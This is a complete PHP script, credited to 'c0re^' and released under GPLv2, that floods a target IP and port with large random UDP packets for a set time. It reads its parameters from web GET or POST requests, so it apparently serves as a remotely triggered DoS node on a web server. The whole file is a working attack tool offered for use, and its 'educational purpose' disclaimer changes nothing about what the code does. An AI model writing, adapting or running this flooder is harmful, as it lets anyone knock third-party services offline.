<?php

/**
 *
 * Script to perform a DoS UDP Flood
 *
 * @author c0re^
 * @license http://www.gnu.org/licenses/old-licenses/gpl-2.0.txt GPLv2
 *
 * This tool is written on educational purpose, please use it on your own good faith.
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 *
 */

error_reporting(E_ERROR | E_WARNING);

ini_set('max_execution_time', 0);

class DoS
{
    const MIN_PACKET_SIZE = 61440; // 60 kB
    const MAX_PACKET_SIZE = 71680; // 70 kB

    /**
     * Target host, e.g. 127.0.0.1
     * @var string
     */
    private $host;

    /**
     * Target port, e.g. 443
     * @var int
     */
    private $port;

    /**
     * Flood time in seconds
     * @var int
     */
    private $time;

    /**
     * DoS constructor.
     * @param $host string Target host
     * @param $port int target port
     * @param $time int flood time in Seconds
     */
    public function __construct($host, $port, $time)
    {
        Preconditions::checkArgument(filter_var($host, FILTER_VALIDATE_IP), "host missing or incorrect format");
        Preconditions::checkArgument(filter_var($port, FILTER_VALIDATE_INT), "port incorrect format");
        Preconditions::checkArgument(filter_var($time, FILTER_VALIDATE_INT), "time missing or incorrect format");

        $this->host = $host;
        $this->port = $port;
        $this->time = $time;
    }

    /**
     * Starts an UPD attack
     * @throws Exception on socket error
     */
    public function flood()
    {
        $packets = $this->generatePackets(1337);

        $endTime = time() + $this->time;

        $socket = @fsockopen("udp://$this->host", $this->port, $errorNumber, $errorMessage, 30);
        if (!$socket) {
            throw new Exception($errorMessage);
        }

        while(time() <= $endTime) {
            @fwrite($socket, $packets[array_rand($packets)]);
        }
        @fclose($socket);
    }

    private function generatePackets($size) {
        $random = Random::get();

        $packets = array();
        for ($i = 0; $i < $size; $i++) {
            $length = mt_rand(DoS::MIN_PACKET_SIZE, Dos::MAX_PACKET_SIZE);
            $packets[] = $random->string($length);
        }
        return $packets;
    }
}

class Preconditions
{
    /**
     * Ensures the truth of an expression involving one or more parameters to the calling method.
     * @param $expression boolean a boolean expression
     * @param $errorMessage string the exception message to use if the check fails
     * @throws InvalidArgumentException if expression is false
     */
    public static function checkArgument($expression, $errorMessage)
    {
        if (!$expression) {
            throw new InvalidArgumentException($errorMessage);
        }
    }
}

interface IRandom
{
    /**
     * Creates a random string whose length is the number of characters specified.
     * @min $length int lowest value to be returned
     * @max $length int highest value to be returned
     * @return string the random string
     */
    public function string($length);
}

class ShuffleRandom implements IRandom
{
    public function string($length)
    {
        return str_shuffle(substr(str_repeat(md5(mt_rand()), 2 + $length / 32), 0, $length));
    }
}

class OpenSSLRandom implements IRandom
{
    public function string($length)
    {
        return bin2hex(openssl_random_pseudo_bytes($length / 2));
    }
}

class Random
{
    /**
     * Creates a random generator depending on the PHP version
     * @return IRandom the random generator
     */
    public static function get()
    {
        // openssl_random_pseudo_bytes is the fastest way to generate a random string
        if (function_exists("openssl_random_pseudo_bytes")) {
            return new OpenSSLRandom();
        } else {
            return new ShuffleRandom();
        }
    }
}

class Application
{
    public static function start($args)
    {
        if (sizeof($args) === 0) {
            echo json_encode(array("status" => "ok"));
            return;
        }

        $host = $args['host'];
        $port = isset($args['port']) ? $args['port'] : 80;
        $time = isset($args['time']) ? $args['time'] : 60;

        $result = null;
        try {
            $dos = new DoS($host, $port, $time);
            $dos->flood();

            $result = array("success" => "true");
        } catch (Exception $e) {
            $result = array("success" => "false", "message" => $e->getMessage());
        }

        echo json_encode($result);
    }
}

Application::start($_POST ? $_POST : $_GET);